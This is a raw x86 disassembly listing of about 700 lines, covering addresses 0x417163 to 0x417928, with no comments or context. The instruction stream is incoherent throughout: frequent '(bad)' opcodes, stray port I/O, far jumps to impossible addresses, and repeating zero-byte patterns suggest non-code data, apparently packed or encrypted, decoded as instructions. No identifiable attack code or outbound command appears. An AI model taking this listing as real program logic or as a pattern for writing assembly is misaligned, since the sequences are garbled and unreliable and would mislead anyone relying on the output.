  417163:	ficom  WORD PTR [ebp+0x44]
  417166:	ss call 0x4501fd20
  41716c:	mov    dh,BYTE PTR [eax-0x1115bf88]
  417172:	xor    ebx,edi
  417174:	cmp    al,0xc0
  417176:	call   0x32bf10
  41717b:	xor    eax,0x3a097a6e
  417180:	mov    bl,0x66
  417182:	ins    BYTE PTR es:[edi],dx
  417183:	jne    0x417133
  417185:	or     ch,bl
  417187:	nop
  417188:	sar    BYTE PTR [edx+edx*8],cl
  41718b:	sbb    ebx,DWORD PTR [ecx]
  41718d:	push   edx
  41718e:	out    0xa5,eax
  417190:	das    
  417191:	pop    edi
  417192:	pop    esi
  417193:	leave  
  417194:	or     ecx,DWORD PTR [esp+eax*1-0x70]
  417198:	jnp    0x4171a3
  41719a:	rcl    DWORD PTR [edi-0x34],0xb6
  41719e:	xchg   eax,edx
  4171a0:	leave  
  4171a1:	jae    0x4171e2
  4171a3:	add    BYTE PTR [eax],al
  4171a5:	add    BYTE PTR [eax],al
  4171a7:	add    BYTE PTR [esp+eiz*4-0x9f4dc37],ch
  4171ae:	es add al,0x19
  4171b1:	int3   
  4171b2:	jae    0x4171f3
  4171b4:	mov    al,ds:0x927c9a4
  4171b9:	or     al,0x7
  4171bb:	mov    DWORD PTR [ecx],edx
  4171bd:	push   ss
  4171be:	or     al,BYTE PTR [eax]
  4171c0:	nop
  4171c1:	mov    eax,DWORD PTR [esi]
  4171c3:	add    ch,bl
  4171c5:	inc    esp
  4171c6:	outs   dx,BYTE PTR ds:[esi]
  4171c7:	sub    DWORD PTR [edx+esi*8],0x705cf73
  4171ce:	pop    DWORD PTR [edi+0xfd4a5d5]
  4171d4:	adc    eax,0xd50270c
  4171d9:	pop    es
  4171da:	dec    edi
  4171db:	dec    edi
  4171dc:	or     DWORD PTR [edi],edx
  4171de:	push   ebx
  4171df:	call   0x4b7053
  4171e4:	jp     0x4171b1
  4171e6:	(bad)  
  4171e8:	inc    edx
  4171e9:	jle    0x4171f4
  4171eb:	add    BYTE PTR [eax-0x7babea20],dl
  4171f1:	mov    DWORD PTR [edx],ecx
  4171f3:	push   0xffffff90
  4171f5:	lock adc eax,0xa898528
  4171fb:	adc    eax,0x75
  4171fe:	hlt    
  4171ff:	mov    al,ah
  417201:	push   esi
  417202:	into   
  417203:	out    0xb8,eax
  417205:	mov    dl,0x95
  417207:	pop    ebx
  417208:	mov    ebp,0x42bdb7
  41720d:	add    BYTE PTR [eax],al
  41720f:	add    BYTE PTR [eax],al
  417211:	pop    esi
  417212:	sub    edx,DWORD PTR [esi-0xa8ee72a]
  417218:	jp     0x4171c4
  41721a:	mov    bh,0x34
  41721c:	pop    es
  41721d:	lahf   
  41721e:	mov    bh,0xe4
  417220:	xor    al,dl
  417222:	mov    bh,0x34
  417224:	add    ecx,DWORD PTR [edi-0xc261b49]
  41722a:	pop    ecx
  41722b:	pop    ebp
  41722c:	jbe    0x417296
  41722e:	mov    bh,0x4f
  417230:	mov    BYTE PTR [eax+0x3e],dl
  417233:	out    0x6e,eax
  417235:	in     al,0x8e
  417237:	sar    DWORD PTR [edx+0x40],1
  41723a:	pop    edi
  41723b:	jl     0x41727a
  41723d:	push   0x9003c405
  417242:	push   edi
  417243:	xchg   edi,eax
  417244:	inc    ecx
  417245:	xchg   esp,eax
  417246:	mov    dl,0x4e
  417248:	mov    gs,WORD PTR [esi-0x4c]
  41724b:	in     eax,0xd8
  41724d:	or     dh,al
  41724f:	arpl   WORD PTR [edi+0x38],sp
  417252:	xor    DWORD PTR [ecx],ecx
  417254:	out    dx,eax
  417255:	xchg   ebx,eax
  417256:	mov    dl,0xe5
  417258:	sar    BYTE PTR [ebp+0x9049b5f],cl
  41725e:	mov    ecx,0xa37417ef
  417263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417264:	add    esp,DWORD PTR [eax-0x49]
  417267:	fldenv [ebx]
  417269:	mov    eax,ds:0xd930e572
  41726e:	bound  esp,QWORD PTR [edx-0x68]
  417271:	lods   al,BYTE PTR ds:[esi]
  417272:	es in  eax,0x3
  417275:	add    BYTE PTR [eax],al
  417277:	add    BYTE PTR [eax],al
  417279:	add    BYTE PTR [eax-0x6344ae07],dl
  41727f:	mov    ebp,ebx
  417281:	push   cs
  417282:	or     eax,0xfc7ee5b1
  417287:	lea    ecx,[esi]
  417289:	popa   
  41728a:	xchg   esp,eax
  41728b:	mov    dl,0xe
  41728d:	sar    DWORD PTR [ebx-0x5e],0xe
  417291:	jmp    0x654064ad
  417296:	loop   0x41724f
  417298:	out    dx,al
  417299:	jmp    0x5dc3297f
  41729e:	js     0x417262
  4172a0:	or     eax,0x54ca93e9
  4172a5:	and    DWORD PTR ds:0x8da989b5,0x32
  4172ac:	and    ch,al
  4172ae:	xchg   ebx,eax
  4172af:	mov    dl,0xef
  4172b1:	cld    
  4172b2:	mov    bh,0xa1
  4172b4:	dec    esi
  4172b5:	jmp    0x7c4065c8
  4172ba:	aam    0x2a
  4172bc:	dec    edx
  4172bd:	add    eax,0xf6ce3265
  4172c2:	push   ss
  4172c3:	sbb    BYTE PTR [esi],cl
  4172c5:	jmp    0xd9b9c5d
  4172ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172cb:	std    
  4172cc:	xchg   edx,eax
  4172cd:	jmp    0x9282565
  4172d2:	dec    ebp
  4172d3:	mov    ch,0xee
  4172d5:	ins    BYTE PTR es:[edi],dx
  4172d6:	or     BYTE PTR [edi-0x4d6c1472],cl
  4172dc:	pop    esi
  4172dd:	mov    eax,0x0
  4172e2:	add    BYTE PTR [ecx-0x4e],cl
  4172e5:	push   ebp
  4172e6:	adc    DWORD PTR [edx+0xffeeed2],esp
  4172ec:	repz jns 0x417364
  4172ef:	mov    gs,WORD PTR [esi+0x2a]
  4172f2:	fld    DWORD PTR [esi-0x6e96d5e2]
  4172f8:	mov    dl,0xe
  4172fa:	cmp    DWORD PTR [ecx-0x18],edi
  4172fd:	in     eax,0xe8
  4172ff:	jno    0x4172b8
  417301:	out    dx,al
  417302:	fs push ebx
  417304:	imul   eax,DWORD PTR ds:[eax],0x5650ea43
  41730b:	fs in  eax,dx
  41730d:	sub    al,BYTE PTR [edx+ebp*4-0x22]
  417311:	icebp  
  417312:	adc    eax,0x4e9c59
  417317:	sub    ch,BYTE PTR [ebp+0x2]
  41731a:	lea    ebp,ds:0xb900868d
  417320:	mov    cl,0x87
  417322:	inc    esp
  417323:	int    0xf9
  417325:	add    DWORD PTR [ebp+ecx*8-0x7f],0x5e
  41732a:	lea    ebp,[ebp-0x76]
  41732d:	dec    edx
  41732e:	push   eax
  41732f:	stos   BYTE PTR es:[edi],al
  417330:	sbb    esp,0xffffff8d
  417333:	in     eax,0x8d
  417335:	add    BYTE PTR [edx],0x69
  417338:	mov    cl,0x87
  41733a:	je     0x4172c9
  41733c:	repnz out 0xa4,al
  41733f:	mov    cl,0xb0
  417341:	push   cs
  417342:	test   DWORD PTR [ecx+0x6828bd],edi
  417348:	add    BYTE PTR [eax],al
  41734a:	add    BYTE PTR [eax],al
  41734c:	loope  0x4172f0
  41734e:	push   cs
  41734f:	add    BYTE PTR [esi-0x79cbd543],dl
  417355:	pushf  
  417356:	sbb    dl,BYTE PTR [ebx]
  417358:	stc    
  417359:	mov    al,0x85
  41735b:	xor    eax,0x4ea309
  417360:	xchg   esi,eax
  417361:	mov    ebp,0x5f86342a
  417366:	icebp  
  417367:	je     0x4173b6
  417369:	xor    ecx,0x2aed6fd6
  41736f:	movaps xmm4,xmm2
  417372:	pop    ebp
  417373:	push   ebx
  417374:	adc    DWORD PTR [edx+0x45f9001e],esi
  41737a:	sbb    eax,DWORD PTR [eax-0x76110f04]
  417380:	mov    ch,0x92
  417382:	add    DWORD PTR [eax+0x7308e090],eax
  417388:	inc    edi
  417389:	jp     0x4173ee
  41738b:	mov    ah,0xb4
  41738d:	xchg   edi,eax
  41738e:	or     BYTE PTR [eax],al
  417390:	nop
  417391:	inc    esi
  417392:	mov    fs,WORD PTR [eax+ecx*8]
  417395:	retf   0xa
  417398:	popa   
  417399:	add    al,0xbe
  41739b:	and    al,0xbc
  41739d:	retf   0xa
  4173a0:	or     DWORD PTR [edi-0x78e2dfd2],ecx
  4173a6:	and    BYTE PTR cs:[eax+0x50],al
  4173aa:	xor    eax,ebp
  4173ac:	push   esp
  4173ad:	out    0x12,eax
  4173af:	dec    ebx
  4173b0:	add    BYTE PTR [eax],al
  4173b2:	add    BYTE PTR [eax],al
  4173b4:	add    BYTE PTR [edx-0x76],al
  4173b7:	or     al,ch
  4173b9:	aam    0xe5
  4173bb:	push   ss
  4173bc:	push   eax
  4173bd:	loop   0x417349
  4173bf:	or     al,ch
  4173c1:	aam    0xa5
  4173c3:	cmp    dl,BYTE PTR [ecx-0x1e]
  4173c6:	or     cl,BYTE PTR [ebx]
  4173c8:	(bad)
  4173cb:	ds jne 0x417390
  4173ce:	or     cl,BYTE PTR [ebx]
  4173d0:	(bad)
  4173d3:	and    bh,BYTE PTR [esi-0x3af4f53e]
  4173d9:	aam    0xa5
  4173db:	es hlt 
  4173dd:	loop   0x4173e9
  4173df:	or     eax,ebp
  4173e1:	aam    0xe5
  4173e3:	retf   0xe24a
  4173e6:	or     cl,BYTE PTR [ebx]
  4173e8:	call   0x4c667b
  4173ed:	loop   0x4173b9
  4173ef:	jne    0x41737d
  4173f1:	je     0x4173ac
  4173f3:	or     al,BYTE PTR [eax]
  4173f5:	nop
  4173f6:	mov    eax,ds:0xbd0ff9a8
  4173fb:	jo     0x4173be
  4173fd:	addr16 and eax,eax
  417400:	mov    ch,dh
  417402:	mov    dl,0x4a
  417404:	inc    edi
  417405:	arpl   WORD PTR [edi],sp
  417407:	rol    DWORD PTR [esi+0x5763baf4],0xac
  41740e:	pop    edi
  41740f:	ins    BYTE PTR es:[edi],dx
  417410:	dec    ebp
  417411:	inc    esi
  417412:	pop    ebx
  417413:	jle    0x4173dc
  417415:	mov    bl,0x96
  417417:	jl     0x417485
  417419:	add    BYTE PTR [eax],al
  41741b:	add    BYTE PTR [eax],al
  41741d:	add    BYTE PTR [ecx],dl
  41741f:	mov    eax,0x2c13fab9
  417424:	out    0x3,al
  417426:	nop
  417427:	and    eax,0xbb110624
  41742c:	in     eax,0xfa
  41742e:	adc    al,0x6c
  417430:	out    0x3,al
  417432:	nop
  417433:	pop    ebx
  417434:	adc    BYTE PTR [eax],0x80
  417437:	sahf   
  417438:	and    eax,0x69c30904
  41743d:	jno    0x4173dc
  41743f:	cs out dx,eax
  417441:	add    al,0x90
  417443:	mov    dl,0x64
  417445:	mov    bh,0xb3
  417447:	sahf   
  417448:	push   0x4d9d74d1
  41744d:	(bad)  
  41744f:	mov    dl,0x64
  417451:	fbstp  TBYTE PTR [ebx-0x2b831a5e]
  417457:	mov    gs,ebp
  417459:	adc    BYTE PTR [eax+0x34],0xf3
  41745d:	jle    0x41744b
  41745f:	mov    ss,ebp
  417461:	fild   DWORD PTR [edi-0x51]
  417464:	in     eax,0x3
  417466:	loope  0x4174c4
  417468:	sub    BYTE PTR [eax],dl
  41746a:	ins    BYTE PTR es:[edi],dx
  41746b:	sahf   
  41746c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41746d:	add    edx,DWORD PTR [edx+esi*8]
  417470:	popf   
  417471:	adc    eax,0x3e9b2b8
  417476:	nop
  417477:	pop    edi
  417478:	(bad)  
  417479:	rcl    BYTE PTR [ebx*4-0x4daff0e3],cl
  417480:	push   cs
  417481:	pusha  
  417482:	add    BYTE PTR [eax],al
  417484:	add    BYTE PTR [eax],al
  417486:	add    bh,cl
  417488:	mov    ds,WORD PTR [edx]
  41748a:	stos   BYTE PTR es:[edi],al
  41748b:	scas   al,BYTE PTR es:[edi]
  41748c:	push   esi
  41748d:	sub    al,BYTE PTR [ecx]
  41748f:	call   0xb07ef770
  417494:	xchg   esi,eax
  417495:	lods   eax,DWORD PTR ds:[esi]
  417496:	popa   
  417497:	retf   
  417498:	outs   dx,BYTE PTR ds:[esi]
  417499:	push   cs
  41749a:	into   
  41749b:	and    al,0xae
  41749d:	or     eax,0xbdb593e9
  4174a2:	jmp    0x1f502739
  4174a7:	loope  0x41745e
  4174a9:	sbb    ch,bl
  4174ab:	(bad)  
  4174ac:	jb     0x4174bc
  4174ae:	jo     0x417480
  4174b0:	mov    ds,WORD PTR [esi]
  4174b2:	push   0x3c
  4174b4:	mov    ch,0xfe
  4174b6:	ins    BYTE PTR es:[edi],dx
  4174b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b8:	mov    bl,0xee
  4174ba:	jmp    0xe94c277a
  4174bf:	xchg   ebx,eax
  4174c0:	bound  ebx,QWORD PTR [eax+0x7e]
  4174c3:	lahf   
  4174c4:	(bad)  
  4174c5:	add    ch,BYTE PTR [ecx]
  4174c7:	mov    WORD PTR [ecx],?
  4174c9:	push   ebx
  4174ca:	lds    edx,FWORD PTR [edi-0x63f2acc5]
  4174d0:	jmp    0x26c17a27
  4174d5:	sbb    DWORD PTR [esi-0x69],edx
  4174d8:	mov    esi,0x3b93a903
  4174dd:	push   ebx
  4174de:	or     eax,0xe58f1a7c
  4174e3:	xchg   ebx,eax
  4174e4:	mov    dl,0x3e
  4174e6:	lahf   
  4174e7:	pusha  
  4174e8:	scas   eax,DWORD PTR es:[edi]
  4174e9:	add    al,0x41
  4174eb:	add    BYTE PTR [eax],al
  4174ed:	add    BYTE PTR [eax],al
  4174ef:	add    BYTE PTR [eax-0x5a95f10e],ah
  4174f5:	mov    al,0x1e
  4174f7:	imul   esi,DWORD PTR gs:[edx-0x95b16f2],0x32
  4174ff:	in     eax,dx
  417500:	sti    
  417501:	mov    bl,0x1d
  417503:	add    BYTE PTR [ecx+ebx*2+0x4df9000f],ah
  41750a:	push   DWORD PTR [ebx+0x33]
  41750d:	das    
  41750e:	dec    ebx
  41750f:	and    al,0xd9
  417511:	xchg   BYTE PTR [edi+edi*8-0xc],al
  417515:	sbb    eax,0x2cf94000
  41751a:	push   ebx
  41751b:	and    al,0xdd
  41751d:	xor    bh,cl
  41751f:	pcmpeqw mm2,QWORD PTR [edi+ecx*1+0x0]
  417524:	jmp    0x9965c851
  417529:	xchg   BYTE PTR [edi],bh
  41752b:	push   esi
  41752c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41752d:	sbb    eax,DWORD PTR [edx]
  41752f:	sbb    ch,ah
  417531:	jne    0x417521
  417533:	test   cl,ch
  417535:	stos   BYTE PTR es:[edi],al
  417536:	xchg   edx,eax
  417537:	mov    edi,DWORD PTR [ecx-0x4695f14b]
  41753d:	sub    bl,0x74
  417540:	aad    0xe1
  417542:	jmp    0x4175b8
  417544:	vpcmpeqd xmm0,xmm6,XMMWORD PTR [eax]
  417548:	mov    ecx,0x85ff0eb6
  41754d:	rcr    DWORD PTR [esi],1
  41754f:	jmp    DWORD PTR [ecx+edi*4+0x2]
  417553:	inc    eax
  417554:	add    BYTE PTR [eax],al
  417556:	add    BYTE PTR [eax],al
  417558:	add    BYTE PTR [ecx+0xe],ch
  41755b:	jl     0x417506
  41755d:	jns    0x41750c
  41755f:	out    dx,al
  417560:	inc    DWORD PTR [ebp-0x4f]
  417563:	pop    ds
  417564:	rcl    dl,0xc5
  417567:	jmp    0x4175dd
  417569:	test   esi,eax
  41756b:	inc    esp
  41756c:	jmp    DWORD PTR [ebp+edi*2+0x2]
  417570:	inc    eax
  417571:	cmp    DWORD PTR [esi],esi
  417573:	out    0xff,eax
  417575:	add    eax,0x3e007881
  41757a:	(bad)  
  41757b:	iret   
  41757c:	push   eax
  41757d:	add    esp,eax
  41757f:	in     eax,dx
  417580:	call   DWORD PTR [eax-0x7a034065]
  417586:	xchg   edi,eax
  417587:	sbb    eax,0xd1c49040
  41758c:	mov    BYTE PTR [ebp-0x5d],bl
  41758f:	out    0xb4,eax
  417591:	rcl    DWORD PTR [ecx],cl
  417593:	scas   al,BYTE PTR es:[edi]
  417594:	and    esi,DWORD PTR [eax-0x2e406070]
  41759a:	add    DWORD PTR [ebx],0xab75487
  4175a0:	push   0xffffff90
  4175a2:	push   ss
  4175a3:	iret   
  4175a4:	and    esi,DWORD PTR [edx+ebx*2-0x18f6efb6]
  4175ab:	xor    BYTE PTR cs:[eax+0x24],ah
  4175af:	pop    esi
  4175b0:	mov    bh,0x48
  4175b2:	repnz into 
  4175b4:	dec    DWORD PTR [eax]
  4175b6:	mov    edi,0x89a82c2e
  4175bb:	cmc    
  4175bc:	inc    DWORD PTR [eax]
  4175be:	add    BYTE PTR [eax],al
  4175c0:	add    BYTE PTR [eax],al
  4175c2:	scas   eax,DWORD PTR es:[edi]
  4175c3:	inc    ebx
  4175c4:	out    0xfc,eax
  4175c6:	pop    ebp
  4175c7:	adc    ecx,esp
  4175c9:	inc    ebx
  4175ca:	nop
  4175cb:	inc    eax
  4175cc:	add    ah,dh
  4175ce:	sbb    ebx,0x12
  4175d1:	std    
  4175d2:	lds    edx,FWORD PTR ds:0x289043cc
  4175d8:	add    BYTE PTR [eax],dh
  4175da:	mov    ds:0x503112d9,eax
  4175df:	jns    0x4175b5
  4175e1:	pop    eax
  4175e2:	sbb    esi,edi
  4175e4:	xlat   BYTE PTR ds:[ebx]
  4175e5:	ror    DWORD PTR [ecx+ebx*4+0x1d6c88bf],0x47
  4175ed:	fs pop esi
  4175ef:	lahf   
  4175f0:	retf   0xd46b
  4175f3:	cdq    
  4175f4:	out    dx,al
  4175f5:	jae    0x41766c
  4175f7:	icebp  
  4175f8:	ror    BYTE PTR [edx-0x3f91666f],cl
  4175fe:	mov    esp,0x2fd9dbb2
  417603:	aas    
  417604:	mov    ds:0xaf3ddf87,eax
  417609:	cs ja  0x4175a6
  41760c:	cmp    DWORD PTR [ebx+0x17],edi
  41760f:	mov    al,0x15
  417611:	icebp  
  417612:	lahf   
  417613:	cmp    eax,0x260587b3
  417618:	hlt    
  417619:	cmp    WORD PTR [edx-0x455c9979],0xffeb
  417621:	ret    
  417622:	out    dx,eax
  417623:	pushf  
  417624:	std    
  417625:	data16 add BYTE PTR [eax],al
  417628:	add    BYTE PTR [eax],al
  41762a:	add    BYTE PTR [ebx-0x3e],ah
  41762d:	(bad)  
  41762e:	lock mov ebp,DWORD PTR [edi-0x3a2b03bd]
  417635:	sti    
  417636:	(bad)  
  417638:	mov    dl,0x9e
  41763a:	inc    ecx
  41763b:	xchg   esp,eax
  41763c:	mov    dl,0xad
  41763e:	add    BYTE PTR [eax],ch
  417640:	push   ds
  417641:	xor    al,0x4
  417643:	mov    WORD PTR [esi],fs
  417645:	in     eax,0x5b
  417647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417648:	test   DWORD PTR ds:[ebx],0xfe0c730c
  41764f:	pusha  
  417650:	jb     0x41768a
  417652:	inc    edx
  417653:	mov    WORD PTR [edx-0x399bdf6c],?
  417659:	aaa    
  41765a:	add    al,0xe3
  41765c:	cmp    edx,DWORD PTR [ebp+ebp*2-0x4013e56d]
  417663:	ja     0x417618
  417665:	lods   eax,DWORD PTR ds:[esi]
  417666:	jp     0x41764b
  417668:	mov    esi,0x847824c3
  41766d:	je     0x417673
  41766f:	nop
  417670:	ss cmp bh,ch
  417673:	jg     0x417660
  417675:	jmp    0x97f0:0xf7f6b783
  41767c:	scas   eax,DWORD PTR es:[edi]
  41767d:	bsf    ecx,DWORD PTR [edi-0x4526bbc7]
  417684:	sti    
  417685:	push   ss
  417686:	adc    DWORD PTR [eax],ebx
  417688:	stos   DWORD PTR es:[edi],eax
  417689:	out    dx,al
  41768a:	push   ds
  41768b:	retf   0xedc2
  41768e:	pushf  
  41768f:	add    BYTE PTR [eax],al
  417691:	add    BYTE PTR [eax],al
  417693:	add    BYTE PTR [edi+0x45f964ad],cl
  417699:	scas   al,BYTE PTR es:[edi]
  41769a:	fs icebp 
  41769c:	jbe    0x417661
  41769e:	add    dl,ah
  4176a0:	shr    DWORD PTR [esi-0x3dae6bb4],cl
  4176a6:	push   cs
  4176a7:	xchg   esp,eax
  4176a8:	jp     0x417648
  4176aa:	in     eax,0xec
  4176ac:	retf   
  4176ad:	sbb    dl,BYTE PTR [ebx-0x17]
  4176b0:	out    0x4,eax
  4176b2:	call   0x58c1:0x3022d85c
  4176b9:	ds adc cl,ch
  4176bc:	dec    edi
  4176bd:	jb     0x417722
  4176bf:	loope  0x417739
  4176c1:	jecxz  0x417651
  4176c3:	inc    eax
  4176c4:	shr    BYTE PTR [esi+0x232cd963],1
  4176ca:	add    esi,DWORD PTR [edx-0x21]
  4176cd:	mov    esi,0x96a42c99
  4176d2:	inc    esi
  4176d3:	xchg   esp,eax
  4176d4:	xor    eax,0x2cf9faad
  4176d9:	and    eax,DWORD PTR [ebx]
  4176db:	xchg   BYTE PTR [edi-0x42],bh
  4176de:	inc    esp
  4176df:	jle    0x417758
  4176e1:	mov    dh,0xed
  4176e3:	fcomp  QWORD PTR [ebx+0x4de94ec6]
  4176e9:	or     ecx,edx
  4176eb:	stc    
  4176ec:	xchg   ebx,eax
  4176ed:	add    DWORD PTR [edx+0x76b1f64d],ebx
  4176f3:	lds    ebx,FWORD PTR [edi]
  4176f5:	scas   al,BYTE PTR es:[edi]
  4176f6:	adc    dh,BYTE PTR [edi+0x0]
  4176fc:	add    al,bl
  4176fe:	and    DWORD PTR [ebx],ebx
  417700:	add    BYTE PTR ds:0xb546f6d1,cl
  417706:	mov    cl,0xe
  417708:	test   BYTE PTR [ecx-0x5e],ch
  41770b:	push   es
  41770c:	cmp    edi,DWORD PTR [edx+esi*1]
  41770f:	jbe    0x417755
  417711:	cmp    DWORD PTR [ebp-0x420300e2],ebx
  417717:	xchg   edi,eax
  417718:	push   ebp
  417719:	sbb    DWORD PTR [ebx],ebp
  41771b:	pop    edx
  41771c:	or     BYTE PTR [ecx-0x6900163f],dl
  417722:	or     edi,edi
  417724:	(bad)  
  417725:	jl     0x4176e4
  417727:	jmp    0x41779e
  417729:	fnstcw WORD PTR [edi-0x15]
  41772c:	jne    0x41771f
  41772e:	push   ss
  41772f:	add    bh,ah
  417731:	jmp    0xfef0:0xa45dee71
  417738:	call   FWORD PTR [ebx+ebp*1-0x76130905]
  41773f:	jp     0x417785
  417741:	mov    ecx,0x7c8b44ad
  417746:	stos   BYTE PTR es:[edi],al
  417747:	bound  esp,QWORD PTR [ecx]
  417749:	shl    DWORD PTR [ecx+0x2da9019a],1
  41774f:	iret   
  417750:	je     0x4176e3
  417752:	(bad)  [ecx]
  417754:	add    BYTE PTR [eax-0x668b118e],0x16
  41775b:	bound  edx,QWORD PTR [edx+esi*1]
  41775e:	jl     0x41777e
  417760:	mov    eax,DWORD PTR [eax]
  417762:	add    BYTE PTR [eax],al
  417764:	add    BYTE PTR [eax],al
  417766:	les    ebp,FWORD PTR [esi+0x1705cbf6]
  41776c:	in     al,dx
  41776d:	jmp    0x4177c8
  41776f:	push   ss
  417770:	bound  edx,QWORD PTR [esi+eiz*8]
  417773:	pushf  
  417774:	push   ds
  417775:	push   esi
  417776:	neg    BYTE PTR [esi+edx*1+0x2f55cff]
  41777d:	inc    eax
  41777e:	nop
  41777f:	fwait
  417780:	aam    0x5a
  417782:	push   edx
  417783:	stos   DWORD PTR es:[edi],eax
  417784:	adc    dl,BYTE PTR [ebx+0x1b]
  417787:	pop    es
  417788:	jl     0x41778d
  41778a:	mov    eax,0x93ffae7f
  41778f:	dec    ebp
  417790:	addr16 jae 0x417733
  417793:	addr16 xor eax,ebp
  417796:	jmp    0xfddb:0xc00111f
  41779d:	pop    ss
  41779e:	pop    ebx
  41779f:	mov    ss,WORD PTR [edx-0x2643399]
  4177a5:	(bad)  
  4177a6:	ucomiss xmm3,DWORD PTR [edx]
  4177a9:	mov    DWORD PTR [ebp-0x79],ebx
  4177ac:	addr16 dec ebx
  4177ae:	mov    BYTE PTR [ebx-0x64080394],dh
  4177b4:	inc    esi
  4177b5:	adc    edi,ebp
  4177b7:	or     eax,0xa75dfceb
  4177bc:	test   al,0xfc
  4177be:	gs xchg edi,eax
  4177c0:	jno    0x417835
  4177c2:	mov    BYTE PTR [eax+ebp*8+0x17],bh
  4177c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177c7:	fist   DWORD PTR [edx]
  4177c9:	pop    esi
  4177ca:	add    BYTE PTR [eax],al
  4177cc:	add    BYTE PTR [eax],al
  4177ce:	add    BYTE PTR [ebp+0x59],ah
  4177d1:	out    0xff,eax
  4177d3:	adc    BYTE PTR fs:[edi-0xa],bl
  4177d7:	(bad)  
  4177d8:	repz fiadd WORD PTR [ebx-0x70]
  4177dc:	lahf   
  4177dd:	test   al,0x88
  4177df:	sbb    eax,0xa81ec6ab
  4177e4:	leave  
  4177e5:	popf   
  4177e6:	call   DWORD PTR [edi-0x578bacea]
  4177ec:	jo     0x4177f5
  4177ee:	cmp    cl,0xd5
  4177f1:	adc    dh,BYTE PTR [ebx-0x60]
  4177f4:	and    al,0xc8
  4177f6:	pop    ss
  4177f7:	or     eax,edi
  4177f9:	out    0x88,al
  4177fb:	fnsave [edx-0x515b9421]
  417801:	dec    ebp
  417802:	arpl   WORD PTR [ecx-0x40],bp
  417805:	inc    esp
  417806:	fnstcw WORD PTR [edi-0x55]
  417809:	ret    
  41780a:	mul    ebp
  41780c:	stos   DWORD PTR es:[edi],eax
  41780d:	stos   DWORD PTR es:[edi],eax
  41780e:	cmovne esp,DWORD PTR [esi]
  417811:	loopne 0x417875
  417813:	mov    ds:0x37c3cbb2,eax
  417818:	push   cs
  417819:	fwait
  41781a:	inc    ebp
  41781b:	test   BYTE PTR [edx-0x5acb7156],dh
  417821:	repz jmp 0x4177cf
  417824:	div    bh
  417826:	pop    es
  417827:	mov    esi,0x840f8337
  41782c:	sar    edi,1
  41782e:	sub    ebx,DWORD PTR [ecx]
  417830:	mov    dl,0xf7
  417832:	xchg   DWORD PTR [eax],eax
  417834:	add    BYTE PTR [eax],al
  417836:	add    BYTE PTR [eax],al
  417838:	shl    BYTE PTR [esi],1
  41783a:	rcr    BYTE PTR [esi],0xc3
  41783d:	xor    cl,BYTE PTR [edi-0x17d91039]
  417843:	bound  esp,QWORD PTR [ebx-0x3a]
  417846:	pusha  
  417847:	mov    eax,0xc33378f
  41784c:	call   0xcda439f0
  417851:	xchg   edi,eax
  417852:	enter  0x4362,0xc6
  417856:	lods   al,BYTE PTR ds:[esi]
  417857:	fmul   DWORD PTR [edi-0x70275afc]
  41785d:	stos   DWORD PTR es:[edi],eax
  41785e:	ret    
  41785f:	das    
  417860:	test   dl,dh
  417862:	test   ecx,0x3e8704a
  417868:	inc    ebx
  417869:	aaa    
  41786a:	xchg   esp,eax
  41786b:	pop    ecx
  41786c:	xchg   ebx,eax
  41786d:	sbb    ch,ah
  41786f:	(bad)  
  417870:	(bad)  
  417871:	scas   eax,DWORD PTR es:[edi]
  417872:	or     eax,0xe3bf038f
  417877:	and    al,0x68
  417879:	nop
  41787a:	packsswb mm1,QWORD PTR [edx+esi*4-0x3cb8566e]
  417882:	sub    DWORD PTR [esp+ecx*1],ebx
  417885:	adc    edx,DWORD PTR [ebx-0x17]
  417888:	cmp    BYTE PTR [ebx+0x3a5fdced],bh
  41788e:	inc    esp
  41788f:	stc    
  417890:	push   ds
  417891:	not    DWORD PTR [esi]
  417893:	push   ecx
  417894:	add    BYTE PTR [ecx-0x3d51c112],ch
  41789a:	in     eax,dx
  41789b:	mov    esp,0x0
  4178a0:	add    BYTE PTR [edi],bh
  4178a2:	scas   al,BYTE PTR es:[edi]
  4178a3:	fs fldl2t 
  4178a6:	lods   eax,DWORD PTR ds:[esi]
  4178a7:	fs icebp 
  4178a9:	mov    dl,0xbf
  4178ab:	repnz cmc 
  4178ad:	push   ebx
  4178ae:	stos   DWORD PTR es:[edi],eax
  4178af:	dec    esp
  4178b0:	mov    ah,0xcd
  4178b2:	ret    0xb40e
  4178b5:	push   ds
  4178b6:	sahf   
  4178b7:	in     eax,0xec
  4178b9:	sti    
  4178ba:	push   ss
  4178bb:	push   ebx
  4178bc:	jmp    0x7cdb7d58
  4178c1:	add    ebx,DWORD PTR [edi]
  4178c3:	xor    BYTE PTR [ecx],al
  4178c5:	outs   dx,DWORD PTR ds:[esi]
  4178c6:	cmp    BYTE PTR [eax],dl
  4178c8:	jmp    0x1a4eadc
  4178cd:	jge    0x4178ae
  4178cf:	mov    es,WORD PTR [eax-0x38]
  4178d2:	stos   BYTE PTR es:[edi],al
  4178d3:	arpl   cx,di
  4178d5:	xor    BYTE PTR [edi],bl
  4178d7:	pop    es
  4178d8:	jb     0x4178d9
  4178da:	mov    esi,0x9aa02c99
  4178df:	jbe    0x417893
  4178e1:	xor    DWORD PTR [ebp+0x1f30dafa],ebp
  4178e7:	pop    es
  4178e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178e9:	mov    edi,0xc79e44be
  4178ee:	mov    dh,0xed
  4178f0:	sbb    al,0x84
  4178f2:	lods   eax,DWORD PTR ds:[esi]
  4178f3:	add    al,0xf9
  4178f5:	xchg   dl,ch
  4178f7:	push   cs
  4178f8:	add    BYTE PTR [edi+0x6914d069],ch
  4178fe:	popa   
  4178ff:	xchg   edi,eax
  417900:	in     al,dx
  417901:	div    DWORD PTR [ecx+0x6c76]
  417907:	add    BYTE PTR [eax],al
  417909:	add    BYTE PTR [ebp-0x1da9ed52],dh
  41790f:	sbb    DWORD PTR [esi],0x40168874
  417915:	mov    ch,BYTE PTR [eax-0x4a]
  417918:	xchg   edx,eax
  417919:	shl    BYTE PTR [ebp-0x52],0x27
  41791d:	xor    eax,0x529db9
  417922:	add    al,0xa6
  417924:	jmp    0x41799b
  417926:	popa   
  417927:	aaa    
  417928:	inc    edx
